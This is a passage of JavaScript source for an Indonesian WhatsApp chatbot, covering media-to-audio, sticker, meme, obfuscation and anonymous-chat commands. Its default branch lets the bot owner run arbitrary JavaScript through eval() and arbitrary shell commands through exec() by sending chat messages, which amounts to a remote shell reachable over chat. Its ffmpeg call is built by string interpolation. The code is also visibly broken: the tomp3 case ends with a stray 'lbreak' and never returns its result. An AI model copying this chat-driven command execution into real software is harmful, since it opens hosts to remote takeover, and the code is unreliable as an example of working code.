if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply the Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
reply(mess.wait)
mee = await dark.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
dark.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:false, mentions:[m.sender]}, { quoted: m })
break
case 'tomp3':
if (/document/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
reply(mess.wait)
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
mee = await dark.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
lbreak
case 'smeme': {
if (!q) return reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!isMedia) return reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
reply(mess.wait)
mee = await dark.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
mdtid = await (encodeURI(`https://api.memegen.link/images/custom/-/${q}.png?background=${mem}`))
dark.sendImageAsSticker(m.chat, mdtid, m, { packname: global.packname, author: global.author })
}
break
case 'toimg': {
if (!quoted) throw reply(`Reply Image`)
if (!/webp/.test(mime)) throw reply(`balas stiker dengan caption *${prefix + command}*`)
reply(mess.wait)
let media = await dark.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
dark.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
}
break
case 'sticker': case 's':{
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
reply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
dark.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
}
}
break
case 'deobfus':{
function beautifyJavaScript (source) {
const beautify = require('js-beautify').js_beautify
return beautify(source, {indent_size: 2})
}
if(q){
let teks = await beautifyJavaScript(q)
reply(teks)
} else if(isQuotedTeks){
let teks = await beautifyJavaScript(dev.quoted.text)
reply(teks)
} else reply("Masukan code java script")
}
break
case 'obfus':{
if (!q) return reply(`Contoh ${prefix+command} const darkbotz = require('dark-api')`)
let meg = await obfus(q)
reply(`Sukses
${meg.result}`)
}
break
case '>':
case '=>':
case '$':
default:
if (budy.startsWith('=>')) {
if (!itsMedark) return reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!itsMedark) return reply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))
}
}

if (budy.startsWith('$')) {
if (!itsMedark) return reply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}

if (budy.startsWith('uu')){
if (!itsMedark) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
dark.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
dark.sendMessage("6285870808160@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
}
}